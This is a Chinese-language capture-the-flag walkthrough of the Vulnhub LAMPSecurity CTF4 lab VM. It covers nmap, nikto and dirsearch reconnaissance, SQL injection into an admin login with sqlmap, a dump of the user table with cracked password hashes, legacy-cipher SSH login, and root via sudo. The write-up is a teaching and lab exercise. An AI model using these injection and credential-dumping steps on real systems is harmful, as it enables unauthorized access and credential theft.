---
title: Vulnhub-LAMPSecurity CTF4
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# LAMPSecurity: CTF4

> [https://www.vulnhub.com/entry/lampsecurity-ctf4,83/](https://www.vulnhub.com/entry/lampsecurity-ctf4,83/)
> 

## 端口扫描主机发现

1. 探测存活主机，`138`是靶机
    
    ```php
    nmap -sP 192.168.75.0/24 
    //                                    
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-23 14:13 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00062s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00046s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.138
    Host is up (0.00020s latency).
    MAC Address: 00:0C:29:46:5F:67 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00027s latency).
    MAC Address: 00:50:56:F8:B3:1A (VMware)
    Nmap scan report for 192.168.75.131
    Host is up.
    ```
    
2. 探测主机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.138
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-23 14:16 CST
    Nmap scan report for 192.168.75.138
    Host is up (0.00064s latency).
    Not shown: 65512 filtered tcp ports (no-response), 19 filtered tcp ports (host-unreach)
    PORT    STATE  SERVICE
    22/tcp  open   ssh
    25/tcp  open   smtp
    80/tcp  open   http
    631/tcp closed ipp
    MAC Address: 00:0C:29:46:5F:67 (VMware)
    ```
    
3. 探测服务版本以及系统版本
    
    ```php
    nmap -sT -sV -O -p22,80,25,631 192.168.75.138
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-23 14:20 CST
    Nmap scan report for 192.168.75.138
    Host is up (0.00046s latency).
    
    PORT    STATE  SERVICE VERSION
    22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
    25/tcp  open   smtp    Sendmail 8.13.5/8.13.5
    80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
    631/tcp closed ipp
    MAC Address: 00:0C:29:46:5F:67 (VMware)
    Device type: general purpose|remote management|terminal server|switch|proxy server|WAP
    Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (98%), Control4 embedded (96%), Lantronix embedded (96%), SNR embedded (95%), SonicWALL embedded (94%), Dell iDRAC 6 (94%)
    OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:lantronix:slc_8 cpe:/h:snr:snr-s2960 cpe:/o:sonicwall:aventail_ex-6000 cpe:/o:dell:idrac6_firmware cpe:/o:linux:linux_kernel:3.10 cpe:/o:linux:linux_kernel:4.1
    Aggressive OS guesses: Linux 2.6.16 - 2.6.21 (98%), Linux 2.6.13 - 2.6.32 (96%), Control4 HC-300 home controller (96%), Lantronix SLC 8 terminal server (Linux 2.6) (96%), SNR SNR-S2960 switch (95%), SonicWALL Aventail EX-6000 VPN appliance (94%), Linux 2.6.8 - 2.6.30 (94%), Linux 2.6.9 - 2.6.18 (94%), Dell iDRAC 6 remote access controller (Linux 2.6) (94%), Linux 2.6.22 - 2.6.23 (94%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 1 hop
    Service Info: Host: ctf4.sas.upenn.edu; OS: Unix
    ```
    
4. 扫描漏洞
    
    ```php
    nmap -script=vuln -p 22,80,25 192.168.75.138
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-23 14:25 CST
    Pre-scan script results:
    | broadcast-avahi-dos: 
    |   Discovered hosts:
    |     224.0.0.251
    |   After NULL UDP avahi packet DoS (CVE-2011-1002).
    |_  Hosts are all up (not vulnerable).
    // 扫描卡住不知道什么情况
    ```
    
    使用nikto扫描
    
    ```php
    nikto -host 192.168.75.138 -port 22,80,25,631
    //
    - Nikto v2.5.0
    ---------------------------------------------------------------------------
    ---------------------------------------------------------------------------
    ---------------------------------------------------------------------------
    ---------------------------------------------------------------------------
    + Target IP:          192.168.75.138
    + Target Hostname:    192.168.75.138
    + Target Port:        80
    + Start Time:         2024-09-23 14:28:33 (GMT8)
    ---------------------------------------------------------------------------
    + Server: Apache/2.2.0 (Fedora)
    + /: Retrieved x-powered-by header: PHP/5.1.2.
    + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
    + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
    + /robots.txt: Server may leak inodes via ETags, header found with file /robots.txt, inode: 487720, size: 104, mtime: Wed Dec 10 07:39:44 2014. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
    + /sql/: Directory indexing found.
    + /robots.txt: Entry '/sql/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
    + /robots.txt: Entry '/conf/' is returned a non-forbidden or redirect HTTP code (500). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
    + /robots.txt: Entry '/admin/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
    + /robots.txt: contains 5 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
    + Apache/2.2.0 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
    + OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
    + /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
    + /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
    + /admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0995
    + /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835
    + /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
    + /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
    + /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
    + /admin/: This might be interesting.
    + /pages/: Directory indexing found.
    + /pages/: This might be interesting.
    + /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
    + /mail/src/read_body.php: Cookie SQMSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
    + /mail/src/read_body.php: SquirrelMail found.
    + /icons/: Directory indexing found.
    + /images/: Directory indexing found.
    + /admin/admin.php?adminpy=1: PY-Membres 4.2 may allow administrator access. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1198
    + /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
    + /admin/login.php: Admin login page/section found.
    + /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
    + 9078 requests: 1 error(s) and 30 item(s) reported on remote host
    + End Time:           2024-09-23 14:29:18 (GMT8) (45 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested
    
    ```
    
    存在`/robots.txt` ，还发现了几个可能会有兴趣的目录
    
    优先级依然是`80`最大
    

## web渗透

1. 爆破目录
    
    ```php
    dirsearch -u 192.168.75.138       
    //              
    [14:43:15] 301 -  315B  - /admin  ->  http://192.168.75.138/admin/          
    [14:43:15] 200 -    2KB - /admin/                                           
    [14:43:15] 200 -   51B  - /admin/admin.php                                  
    [14:43:16] 200 -    2KB - /admin/index.php                                  
    [14:43:16] 200 -  769B  - /admin/login.php                                  
    [14:43:27] 301 -  318B  - /calendar  ->  http://192.168.75.138/calendar/    
    [14:43:27] 403 -  289B  - /cgi-bin/                                         
    [14:43:29] 500 -  617B  - /conf                                             
    [14:43:29] 500 -  617B  - /conf/                                            
    [14:43:29] 500 -  617B  - /conf/catalina.properties
    [14:43:29] 500 -  617B  - /conf/catalina.policy
    [14:43:29] 500 -  617B  - /conf/context.xml
    [14:43:29] 500 -  617B  - /conf/logging.properties
    [14:43:29] 500 -  617B  - /conf/tomcat-users.xml
    [14:43:29] 500 -  617B  - /conf/web.xml
    [14:43:29] 500 -  617B  - /conf/Catalina                                    
    [14:43:29] 500 -  617B  - /conf/server.xml                                  
    [14:43:29] 500 -  617B  - /conf/tomcat8.conf
    [14:43:35] 403 -  287B  - /error/                                           
    [14:43:39] 301 -  316B  - /images  ->  http://192.168.75.138/images/        
    [14:43:39] 200 -  905B  - /images/
    [14:43:40] 301 -  313B  - /inc  ->  http://192.168.75.138/inc/              
    [14:43:40] 200 -    1KB - /inc/                                             
    [14:43:44] 301 -  314B  - /mail  ->  http://192.168.75.138/mail/            
    [14:43:44] 302 -    0B  - /mail/  ->  src/login.php                         
    [14:43:50] 301 -  315B  - /pages  ->  http://192.168.75.138/pages/          
    [14:43:50] 200 -    1KB - /pages/                                           
    [14:43:57] 401 -  480B  - /restricted                                       
    [14:43:57] 200 -  104B  - /robots.txt                                       
    [14:44:01] 301 -  313B  - /sql  ->  http://192.168.75.138/sql/              
    [14:44:02] 200 -  868B  - /sql/                                             
    [14:44:08] 301 -  315B  - /usage  ->  http://192.168.75.138/usage/                                              
    ```
    
2. 访问感兴趣的目录
    - `robots.txt`
        
        ```php
        User-agent: *
        Disallow: /mail/
        Disallow: /restricted/
        Disallow: /conf/
        Disallow: /sql/
        Disallow: /admin/
        ```
        
        扫描出来的目录，无意义了
        
    - `http://192.168.75.138/mail/src/login.php`  SquirreMail 的登陆页面
    - `/sql/db.sql` 存在一个敏感文件，是创建表的数据，对sql注入可能有帮助
        
        ```php
        use ehks;
        create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null);
        create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null);
        create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null);
        ```
        
    - `/restricted` 进入了提示让你输入入账号密码
    - `/admin` 一个登陆界面，上面的`sql`文件应该是对应这个网站的
3. 尝试`sql`注入`/admin` ，因为`db.sql` 把表结构爆出来了
    
    `burp`抓包来尝试`sql`注入
    
    ```php
    username=admin'&password=1
    // 
    Problem with query:
    select user_id from user where user_name='admin'' AND user_pass = md5('1')
    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1')' at line 2
    ```
    
    直接把`sql`语句爆出来了，继续注入，可以使用`sqlmap` ，将抓出来的包内容复制出来保存为`post`，然后使用`sqlmap`注入
    
    ```php
    //POST 内容
    POST /admin/index.php HTTP/1.1
    Host: 192.168.75.138
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 34
    Origin: http://192.168.75.138
    Sec-GPC: 1
    Connection: keep-alive
    Referer: http://192.168.75.138/admin/
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    
    username=*&password=1
    ```
    
    直接  `sqlmap -r post -dbs` 爆出数据库名是`ehks` 
    
    因为`index`页面写着**`Professor Ehks Center for Data Studies`** ，所以我们把他数据`dump`出来
    
    爆出用户数据，密码没爆出来
    
    ```php
    sqlmap -r post -D ehks -T user --dump
    //
    user_id	user_name	user_pass
    1	      dstevens	
    2	      achen	
    3	      pmoore	
    4	      jdurbin	
    5	      sorzek	
    6	      ghighland	
    
    ```
    
    单独`dump` 密码
    
    ```php
     sqlmap -r post -D ehks -T user -C user_pass --dump
    //
    +--------------------------------------------------+
    | user_pass                                        |
    +--------------------------------------------------+
    | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |
    | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
    | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
    | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
    +--------------------------------------------------+
    ```
    
4. `Blog`后台和`mail`后台都可以登陆进去，寻找可利用点，甚至ssh
    - `Blog`找不到可利用点
    - `mail` 后台是`SquirreMail1.4.17` ，存在远程代码执行漏洞，不过很麻烦先试试`ssh`
    - `ssh`登陆显示，版本太旧的原因
        
        ```php
        ssh pmoore@192.168.75.138
        Unable to negotiate with 192.168.75.138 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
        ```
        
        指令修改为即可尝试登录
        
        ```php
        ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -oCiphers=+3des-cbc pmoore@192.168.75.138
        ```
        
        最后使用 `dstevens` 和`ilike2surf` 成功登录获得`shell`
        

## 提权

1. 查看当前shell权限
    
    ```php
    [dstevens@ctf4 ~]$ whoami
    dstevens
    [dstevens@ctf4 ~]$ dpkg -l
    -bash: dpkg: command not found
    [dstevens@ctf4 ~]$ sudo -l
    Password:
    User dstevens may run the following commands on this host:
        (ALL) ALL
    
    ```
    
    权限是超级高的，相当于root权限
    
    ```php
    [dstevens@ctf4 ~]$ sudo -i
    [root@ctf4 ~]# 
    ```
    
    获得root权限了